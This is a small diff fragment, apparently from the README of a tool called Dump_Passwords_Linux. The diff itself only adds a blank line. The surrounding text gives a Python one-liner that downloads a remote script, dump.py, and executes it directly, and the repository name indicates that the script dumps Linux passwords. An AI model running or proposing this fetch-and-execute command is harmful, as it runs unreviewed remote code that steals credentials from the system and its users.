@@ -12,6 +12,7 @@ optional arguments:
 
 
 Or just: 
+
 python -c 'import urllib;exec urllib.urlopen("https://raw.githubusercontent.com/Kapalov/Dump_Passwords_Linux/master/dump.py").read()'
 
 
